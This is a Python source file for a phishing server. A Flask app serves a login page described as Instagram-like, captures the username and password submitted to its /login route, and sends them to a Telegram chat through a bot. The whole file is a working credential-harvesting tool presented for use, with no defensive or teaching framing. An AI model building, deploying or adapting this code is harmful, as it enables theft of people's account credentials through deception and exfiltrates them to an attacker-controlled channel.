import telebot
from flask import Flask, request, render_template
from threading import Thread
import os

# --- Telegram Bot Setup ---
TOKEN = os.environ.get('TELEGRAM_TOKEN')  # Get the bot token from environment variables
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')  # Get the chat ID from environment variables
print(TOKEN)  # Just for debugging (should be removed later for security reasons)
bot = telebot.TeleBot(TOKEN)  # Initialize the bot with the token

# --- Flask Setup ---
app = Flask(__name__)

# --- Function to send message to Telegram Bot ---
def send_message_to_bot(message):
    bot.send_message(chat_id=CHAT_ID, text=message)

# --- Route to serve login page (Instagram-like) ---
@app.route('/')
def login_page():
    return render_template('login_page.html')  # Make sure this file exists

# --- Route for form submission (e.g., login) ---
@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the username and password into the Telegram bot
    send_message_to_bot(f"Login Attempt: Username: {username}, Password: {password}")

    return "Login Attempted. The bot has been notified."

# --- Flask Keep Alive ---
def run_flask():
    app.run(host='0.0.0.0', port=5000)

# --- Start Flask in a background thread ---
def start_flask():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# --- Start the Flask server in a thread ---
start_flask()

# --- Ensure bot polling runs only once ---
if __name__ == "__main__":
    # Start the bot polling (make sure it only runs once)
    bot.remove_webhook()
    bot.polling(none_stop=True)
